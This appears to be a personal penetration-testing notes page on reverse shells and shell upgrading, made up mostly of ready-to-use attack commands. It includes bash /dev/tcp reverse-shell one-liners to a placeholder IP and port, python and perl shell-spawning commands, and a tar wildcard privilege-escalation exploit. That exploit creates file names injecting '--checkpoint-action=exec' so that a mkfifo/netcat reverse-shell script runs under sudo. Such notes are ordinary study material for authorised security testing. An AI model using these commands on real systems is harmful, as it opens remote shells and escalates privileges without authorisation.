# Resources
- [Hacktricks Reverse Shells](https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/linux)
- [RevShells](https://www.revshells.com/)
- https://pentestmonkey.net/category/tools/web-shells
- [Payloads All The Things - Repo](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [Socat](https://linux.die.net/man/1/socat)
- [Netcat](../../Tools/Netcat.md)

---
# Shellnanigans

# Upgrading_Shells
- Non-interactive shell session
	- `/bin/bash -i` : launches bash interactive
	- `cat /etc/shells` to view available shells
	- `python --version` : see if python is available
		- `python -c 'import pty; pty.spawn("/bin/bash")'` : spawn bash
	- `perl -e 'exec "/bin/bash";'`
		- `perl -e 'system("/bin/bash");'`
	- can lookup different languages
- `env` check shell environment, add variables if not existing
	- `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`
	- `export TERM=xterm`
	- `export SHELL=bash`
- connect bash to netcat over sockets
	- `bash -i >& /dev/tcp/<IP>/<port> 0>&1`


Tar being called with sudo wildcard `*` [HelpNetSecurity](https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/?ref=blog.tryhackme.com) explanation
```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> 1234 >/tmp/f" > shell.sh
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
touch "/var/www/html/--checkpoint=1"
```

---

# Scripts
## Python3
```python
import subprocess

def spawn_bash():
    # Spawns an interactive Bash shell
    subprocess.run("/bin/bash")

if __name__ == "__main__":
    spawn_bash()

```

## Python2
```python
import subprocess

def spawn_bash():
    # Spawns an interactive Bash shell
    subprocess.call("/bin/bash")

if __name__ == "__main__":
    spawn_bash()

```

## BASH
```bash
#!/bin/bash

bash -i >& /dev/tcp/<IP>/<port> 0>&1
```
